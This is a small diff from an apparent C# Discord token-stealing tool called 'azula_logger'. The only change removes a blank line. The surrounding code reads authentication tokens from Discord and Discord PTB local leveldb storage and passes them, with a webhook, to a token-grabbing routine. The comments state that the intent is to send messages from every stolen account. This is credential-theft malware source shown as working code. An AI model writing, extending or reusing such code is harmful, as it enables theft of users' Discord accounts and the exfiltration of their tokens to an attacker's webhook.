@@ -51,7 +51,6 @@ namespace azula_logger
 
             //making a list with all the tokens so we can try to send a message from all of them
             List<string> tokensss = new List<string>();
-
             //adding all the tokens to our list
             tokensss.Add(TokenGetter.ReturnToken(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local Storage\leveldb\", "*.ldb", webhook, image));
             tokensss.Add(TokenGetter.ReturnToken(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discordptb\Local Storage\leveldb", "*.ldb", webhook, image));
